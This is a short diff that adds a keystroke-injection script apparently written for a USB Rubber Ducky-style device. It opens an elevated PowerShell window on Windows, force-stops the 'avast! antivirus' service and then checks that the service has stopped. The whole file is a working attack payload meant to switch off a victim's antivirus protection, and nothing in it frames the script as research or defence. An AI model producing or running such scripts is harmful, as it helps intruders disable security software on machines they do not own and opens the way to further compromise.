@@ -1,0 +1,17 @@
+DELAY 300
+GUI s
+DELAY 300
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 500
+STRING get-service
+ENTER
+DELAY 750
+STRING stop-service -force "avast! antivirus"
+ENTER
+DELAY 750
+ENTER
+DELAY 500
+STRING get-service "avast! antivirus"
+ENTER
